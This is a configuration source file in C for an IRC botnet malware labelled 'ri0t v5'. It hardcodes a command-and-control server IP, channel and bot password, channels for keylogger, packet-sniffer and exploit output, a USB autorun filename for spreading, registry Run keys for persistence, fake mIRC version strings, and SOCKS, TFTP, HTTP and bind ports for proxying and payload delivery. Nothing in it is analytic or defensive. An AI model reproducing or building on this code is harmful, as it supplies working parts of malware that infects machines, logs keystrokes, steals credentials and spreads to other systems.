unsigned short port = 6000;
unsigned short port2 = 0;
unsigned short socks4port = 9000;
unsigned short tftpport = 69;
unsigned short httpport = 8085;
unsigned short BIND_PORT = 4460;
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;


char prefix = '.';
int maxrand = 4;
int nicktype = CONSTNICK;
BOOL nickprefix = FALSE;

#ifdef DEBUG_LOGGING
char logfile[]="debugger.txt";
#endif

#ifndef NO_CRYPT
//
#else

char botid[] = "[ri0t v5]";
char version[] = ".::[ri0t v5]-[2008 by h1t3m]::.";
char password[] = "rewt";
char server[] = "72.8.156.95";
char serverpass[] = "";
char channel[] = "#lobby";	
char chanpass[] = "";				
char server2[] = "";		
char channel2[] = "";			
char chanpass2[] = "";			
char filename[] = "RIOTBOT.exe";		
char keylogfile[] = "RIOTBOT.log";			
char valuename[] = "RIOTBOT";		
char nickconst[] = "ri0t[v5]";			
char szLocalPayloadFile[]="RIOTBOT.exe";	
char modeonconn[] = "-x+i";				
char chanmode[] = "+snt";				
char exploitchan[] = "#test";		
char keylogchan[] = "#test";			
char psniffchan[] = "#test";			

char *authost[] = {
	"h1t3m@h1t3m.gov",
};

char USB_STR_FILENAME[]	= "autorunme.exe";

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "sEndue3u3hubduyawvd";
#endif
